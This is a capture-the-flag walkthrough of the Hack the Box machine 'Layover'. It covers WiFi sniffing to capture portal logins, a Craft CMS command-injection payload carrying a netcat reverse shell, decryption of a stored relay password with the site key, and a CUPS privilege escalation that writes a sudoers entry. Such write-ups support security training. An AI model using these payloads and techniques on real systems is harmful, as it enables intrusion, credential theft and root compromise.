@@ -1,0 +1,482 @@
+---
+source: Hack the Box
+title: Layover
+difficulty: medium
+tags: WiFi, Craft CMS, Decryption, CUPS
+summary: The pentester is given initial credentials to perform a security test on HTB International. After gaining access to the machine, the attacker can sniff the wireless traffic and capture user credentials which allows them to gain access to the portal's admin panel. The site is using Craft CMS which is vulnerable to command injection. The attacker can abuse this to execute code on the webserver and gain access. Database credentials are found and the source code of the web app allows the attacker to construct the decryption logic and obtain another users credentials. After pivoting to the new user, a vulnerable CUPS service can be exploited to gain root access and fully compromise the machine.
+---
+
+> As is common in real life pentests, you will start the Layover box with credentials for the following account contractor / Contractor2026!
+
+## [01] Port Scan and Service Discovery
+```term
+$ sudo nmap -p- -sC -sV -oN scans/nmap_all_tcp.txt 10.129.94.240
+
+PORT     STATE SERVICE       REASON         VERSION
+??22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
+|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
+??3389/tcp open  ms-wbt-server syn-ack ttl 63 Microsoft Terminal Service
+Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+```
+
+With our given credentials, we can attempt to RDP into the machine.
+
+## [02] Finding Credentials, Compromising the Portal Web Server
+
+The credentials allow us to access the machine. Opening a terminal and checking for user privileges shows the following:
+```term
+$ contractor@airside-ws01:~$ sudo -l
+[sudo] password for contractor: 
+Matching Defaults entries for contractor on airside-ws01:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User contractor may run the following commands on airside-ws01:
+!!    (ALL : ALL) ALL
+```
+
+We have root access to this machine. Opening the web browser shows a landing page with `wifi.international.htb`. We can also see on the Desktop interface that we currently do not have an active wifi connection.
+We can verify by checking our interface configuration.
+```term
+$ root@airside-ws01:~# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.159.143.45  netmask 255.255.255.0  broadcast 10.159.143.255
+        inet6 fe80::216:3eff:fe83:ea41  prefixlen 64  scopeid 0x20<link>
+        inet6 fd42:3ff5:6554:20e5:216:3eff:fe83:ea41  prefixlen 64  scopeid 0x0<global>
+        ether 00:16:3e:83:ea:41  txqueuelen 1000  (Ethernet)
+        RX packets 254  bytes 29470 (29.4 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 743  bytes 77158 (77.1 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 8920  bytes 12189061 (12.1 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8920  bytes 12189061 (12.1 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+??wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+??wlan3: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+We can scan for networks that we can try to join.
+```term
+$ root@airside-ws01:~# nmcli device wifi list
+IN-USE  BSSID              SSID                    MODE   CHAN  RATE       SIGNAL  BARS  SECURITY 
+!!        02:00:00:00:00:00  HTB International WiFi  Infra  6     54 Mbit/s  100     ▂▄▆█  --       
+
+IN-USE  BSSID              SSID                    MODE   CHAN  RATE       SIGNAL  BARS  SECURITY 
+!!        02:00:00:00:00:00  HTB International WiFi  Infra  6     54 Mbit/s  100     ▂▄▆█  --      
+```
+
+We see the `HTB International WiFi` has the security mode set to `--`, that means there is no password needed to join the network. We can join the network and verify we get an IP.
+
+```term
+$ root@airside-ws01:~# nmcli device wifi connect "HTB International WiFi"
+!!Device 'wlan2' successfully activated with '6040972f-4b47-4b75-b700-0ffb4b3dfa7f'.
+??root@airside-ws01:~# ip addr show wlan2
+6: wlan2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
+!!    inet 10.13.37.182/24 brd 10.13.37.255 scope global dynamic noprefixroute wlan2
+       valid_lft 43184sec preferred_lft 43184sec
+    inet6 fe80::83cf:1ad9:d3b:e714/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+```
+
+Since we are on wifi, we can create a virtual interface and use it to sniff the wifi traffic from the air. We can do so as such:
+```term
+??root@airside-ws01:~# iw phy phy2 interface add snf0 type monitor
+??root@airside-ws01:~# ip link set wlan2 down
+??root@airside-ws01:~# iw dev snf0 set channel 6
+??root@airside-ws01:~# ip link set wlan2 up
+??root@airside-ws01:~# ip link set snf0 up
+```
+
+We also have wireshark on the box, which makes for sniffing traffic quite easy. This could also be done with something like tcpdump.
+
+Looking through the packets we get a hit on something valuable:
+
+```term
+Frame 179: 321 bytes on wire (2568 bits), 321 bytes captured (2568 bits) on interface snf0, id 0
+Radiotap Header v0, Length 26
+802.11 radio information
+IEEE 802.11 Data, Flags: .......T
+Logical-Link Control
+Internet Protocol Version 4, Src: 10.13.37.132, Dst: 10.13.37.10
+Transmission Control Protocol, Src Port: 43984, Dst Port: 80, Seq: 1, Ack: 1, Len: 211
+??Hypertext Transfer Protocol
+??    POST /miles/login.php HTTP/1.1\r\n
+??    Host: portal.international.htb\r\n
+    User-Agent: curl/8.5.0\r\n
+    Accept: */*\r\n
+    Content-Length: 39\r\n
+    Content-Type: application/x-www-form-urlencoded\r\n
+    \r\n
+    [Full request URI: http://portal.international.htb/miles/login.php]
+    [HTTP request 1/1]
+    [Response in frame: 193]
+    File Data: 39 bytes
+HTML Form URL Encoded: application/x-www-form-urlencoded
+
+Frame 179: 321 bytes on wire (2568 bits), 321 bytes captured (2568 bits) on interface snf0, id 0
+Radiotap Header v0, Length 26
+802.11 radio information
+IEEE 802.11 Data, Flags: .......T
+Logical-Link Control
+Internet Protocol Version 4, Src: 10.13.37.132, Dst: 10.13.37.10
+Transmission Control Protocol, Src Port: 43984, Dst Port: 80, Seq: 1, Ack: 1, Len: 211
+Hypertext Transfer Protocol
+HTML Form URL Encoded: application/x-www-form-urlencoded
+!!    Form item: "username" = "jenny"
+!!    Form item: "password" = "xxxxxxxx"
+```
+
+These are user credentials being used to login to the portal. We can create a directory fuzzer and see if there are any other endpoints on this web server.
+
+```bash
+#!/bin/bash
+
+while read -r path; do
+    status=$(curl -s -o /dev/null -w "%{http_code}" "http://portal.international.htb/$path")
+
+    case "$status" in
+        200|301|302|303|307|308)
+            echo "$status $path"
+            ;;
+    esac
+done < dir.txt
+```
+> Note: I copied over a directory listing from the SecLists wordlists from my attacker machine, this is what will be used to find endpoints on the web server.
+
+Now we can run it and see if we get any hits.
+
+```term
+$ root@airside-ws01:/tmp# bash fuzz.sh 
+200 #
+200 #
+200 #
+200 #
+200 
+200 index
+!!302 admin
+301 assets
+```
+/admin looks interesting. When navigating to the endpoint, we are greeted with an admin login. We now have two sets of credentials we can try against the form, one of which, works.
+
+After successful login we can see on the footer `Craft CMS Solo 2.9.8`. Looking for vulnerabilites in this software leads us to the following advisory:
+> https://github.com/advisories/GHSA-qrgm-p9w5-rrfw
+
+We are given a simple proof of concept, which we can tailor to our needs. Opening up the browser Console, we can virtually copy the request and fill in what we need wrapping it in JavaScript.
+```js
+fetch('/admin/actions/element-search/search', {
+  method: 'POST',
+  credentials: 'same-origin',
+  headers: {
+    'Accept': 'application/json',
+    'Content-Type': 'application/json',
+    'X-CSRF-Token': Craft.csrfTokenValue
+  },
+  body: JSON.stringify({
+ "elementType": "craft\\elements\\Category",
+ "siteId": 1,
+ "search": "",
+ "condition": {
+   "class": "craft\\elements\\conditions\\ElementCondition",
+   "elementType": "craft\\elements\\Category",
+   "fieldLayouts": [
+     {
+       "as rce": {
+         "__class": "yii\\behaviors\\AttributeTypecastBehavior",
+         "__construct()": [
+           {
+             "attributeTypes": {
+               "typecastBeforeSave": [
+                 "Psy\\Readline\\Hoa\\ConsoleProcessus",
+                 "execute"
+               ]
+             },
+!!             "typecastBeforeSave": "busybox nc 10.13.37.182 4000 -e /bin/bash"
+           }
+         ]
+       },
+       "on *": "self::beforeSave"
+     }
+   ]
+ }
+})
+})
+.then(async r => console.log(r.status, await r.text()));
+```  
+Now start a listener on the initial victim machine and send the JavaScript.
+```term
+$ contractor@airside-ws01:~$ nc -lvnp 4000
+Listening on 0.0.0.0 4000
+Connection received on 10.13.37.10 45434
+whoami
+www-data
+```
+> Note: I had a lot of trouble trying to get curl to work with this exploit, using the Console in the browser tools was much easier.
+
+## [03] Dumping the Database, Decrypting User Credentials
+
+We now have access to another machine. Looking through some web server files we can find database configs.
+
+```term
+$ www-data@portal:~/portal$ cat .env
+# Read about configuration, here:
+# https://craftcms.com/docs/5.x/configure.html
+
+# The application ID used to to uniquely store session and cache data, mutex locks, and more
+CRAFT_APP_ID=CraftCMS--41606de1-cf7a-4fc5-8b1e-6f746d801adf
+
+# The environment Craft is currently running in (dev, staging, production, etc.)
+CRAFT_ENVIRONMENT=production
+
+# General settings
+CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
+CRAFT_DEV_MODE=false
+CRAFT_ALLOW_ADMIN_CHANGES=false
+CRAFT_DISALLOW_ROBOTS=true
+
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craft
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=
+CRAFT_DB_TABLE_PREFIX=
+
+PRIMARY_SITE_URL=http://portal.international.htb/
+CRAFT_ENABLE_TWIG_SANDBOX=true
+```
+
+We can also find an interesting snippet in another file:
+```term
+$ www-data@portal:~/portal/modules/htbairways$ cat Module.php 
+---snip---
+ * HTB Airways — Craft integration module.
+ *
+ * Provides the "HTB Airways Miles" loyalty integration. Outbound member mail
+ * (Miles balance statements) is delivered through the HTB Airways SMTP relay;
+?? * the relay settings — host, port, username and the (encrypted) password — live
+?? * in the `htbairways_settings` table.
+ *
+?? * The relay password is stored ENCRYPTED with the site security key and is only
+?? * decrypted in memory at send time (see console/controllers/MilesController).
+ * It is never written to configuration or logs in cleartext.
+---snip---
+```
+
+
+Looking at the file use to decrypt the relay password shows the following:
+```php
+    private function relayConfig(): array
+    {
+        $kv = array_column(
+            (new Query())->select(['name', 'value'])->from('{{%htbairways_settings}}')->all(),
+            'value',
+            'name'
+        );
+
+!!        $securityKey = Craft::$app->getConfig()->getGeneral()->securityKey;
+!!        $password = Craft::$app->getSecurity()
+!!            ->decryptByKey(base64_decode($kv['mailRelayPassword']), $securityKey);
+
+        return [
+            'host' => $kv['mailRelayHost'] ?? 'mail.htbairways.htb',
+            'port' => (int)($kv['mailRelayPort'] ?? 587),
+            'user' => $kv['mailRelayUser'] ?? 'aporter',
+            'password' => $password,
+        ];
+    }
+```
+Now we need the encrypted value in the database, which the previous files told us where it was stored.
+```term
+$ www-data@portal:~/portal$ mysql -h localhost -u craftuser -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 87
+Server version: 10.11.14-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+??MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| craft              |
+| information_schema |
++--------------------+
+2 rows in set (0.001 sec)
+
+??MariaDB [(none)]> use craft;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+??MariaDB [craft]> select * from htbairways_settings;
++----+-------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+
+| id | name              | value                                                                                                                                                                        | dateCreated         | dateUpdated         |
++----+-------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+
+!!|  1 | mailRelayPassword | u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w= | 2026-07-16 03:19:52 | 2026-07-16 03:19:52 |
+|  2 | mailRelayHost     | mail.htbairways.htb                                                                                                                                                          | 2026-08-11 13:31:23 | 2026-08-11 13:31:23 |
+|  3 | mailRelayPort     | 587                                                                                                                                                                          | 2026-08-11 13:31:23 | 2026-08-11 13:31:23 |
+!!|  4 | mailRelayUser     | aporter                                                                                                                                                                      | 2026-08-11 13:31:23 | 2026-08-11 13:31:23 |
++----+-------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+
+```
+
+We now have all the pieces needed to decrypt the password. We can do so with the craft shell.
+
+```term
+$ www-data@portal:~/portal$ php craft shell
+   User Notice  Writing to directory /var/www/.config/psysh is not allowed.
+??www-data@portal:~/portal$ mkdir -p /tmp/psysh
+??www-data@portal:~/portal$ XDG_CONFIG_HOME=/tmp php craft shell
+```
+```php
+Psy Shell v0.12.24 (PHP 8.3.6 — cli) by Justin Hileman
+??> Craft::$app->getSecurity()
+
+= craft\services\Security {#6346
+    +cipher: "AES-128-CBC",
+    +allowedCiphers: [
+      "AES-128-CBC" => [
+        16,
+        16,
+      ],
+      "AES-192-CBC" => [
+        16,
+        24,
+      ],
+      "AES-256-CBC" => [
+        16,
+        32,
+      ],
+    ],
+    +kdfHash: "sha256",
+    +macHash: "sha256",
+    +authKeyInfo: "AuthorizationKey",
+    +derivationIterations: 100000,
+    +passwordHashStrategy: null,
+    +passwordHashCost: 13,
+    +sensitiveKeywords: [
+      "key",
+      "pass",
+      "password",
+      "pw",
+      "secret",
+      "sk",
+      "tok",
+      "token",
+    ],
+  }
+
+??> $key = 'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr';
+
+= "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr"
+
+??> $encrypted = base64_decode('u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=');
+
+= b<<<EOS
+  »A;:\x06Áyha>}Gj;\x05084d2a750e524c1b0ed940adea92a2374f8f2c88cb54b403e06aac3e99e6ab30e\x0F¬cf#
+  ”8ò÷cH\x1A‡\x14Eç\vð°\x11Ý\x03sßãçu^t8#u¿r ÅìúÿçÊ•|ú\r—œ
+  EOS
+
+??> Craft::$app->getSecurity()->decryptByKey($encrypted, $key);
+
+!! = "xxxxxxxx"
+```
+> Note: Notice that we did not have write privilege to our current directory, so we had to create a new one and shift the config variable.
+
+We now have a new set of credentials. We can attempt to ssh into the machine as out new user.
+```term
+$ contractor@airside-ws01:~$ ssh aporter@10.13.37.10
+The authenticity of host '10.13.37.10 (10.13.37.10)' can't be established.
+ED25519 key fingerprint is SHA256:3zC8PGwDfCgcR1KjYS3E5WmhpZlk+tdqTI47GLwTS1k.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.13.37.10' (ED25519) to the list of known hosts.
+aporter@10.13.37.10's password: 
+!!aporter@portal:~$ 
+```
+
+## [04] Privilege Escalation via CUPS
+
+Looking at running processes yields the following:
+```term
+$ aporter@portal:~$ ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+---snip---
+root         280  0.0  0.1  19152  6724 ?        Ss   15:11   0:00 /usr/sbin/cupsd -f
+---snip---
+```
+
+We can check the cupsd version:
+```term
+$ aporter@portal:~$ cups-config --build
+cups-2.4.16
+```
+
+Doing research on that version, we can find the following site.
+> https://vulmon.com/vulnerabilitydetails?qid=CVE-2026-34990
+
+This site also points us to a github advisory page here:
+> https://github.com/gbuyssens/CVE-2026-34990
+
+The advisory states the following:
+> Local privilege escalation against a root cupsd. When coerced into acting as an IPP client toward a rogue local server, cupsd answers a 401 WWW-Authenticate: Local challenge by replaying its own admin token. Capturing that token lets an unprivileged user drive cupsd as admin (root). A persistent file:// print queue (printer-is-temporary=false) bypasses the FileDevice policy, so a raw Print-Job writes attacker bytes to any path as root — here a NOPASSWD sudoers fragment.
+
+It also has a python script with the exploit already written. We can copy this to the victim machine and run it.
+```term
+$ aporter@portal:/tmp$ python3 root.py 
+CVE-2026-34990 — CUPS local privilege escalation (cups2root, de-harnessed)
+[*] target user = aporter  ::  cupsd = 127.0.0.1:631
+[+] Local token: 091C0A8F635777C8F01935BDE37AC34D
+[*] step 1: write sudoers fragment
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+    [sw] queue add 0x0000 / print HTTP 200 0x0000
+[*] sudo -n id -> rc_ok=True :: uid=0(root) gid=0(root) groups=0(root)
+[+] ROOT via sudoers
+aporter@portal:/tmp$ sudo -l
+Matching Defaults entries for aporter on portal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User aporter may run the following commands on portal:
+    (ALL) NOPASSWD: ALL
+??aporter@portal:/tmp$ sudo su -
+??root@portal:~# whoami
+!!root
+```
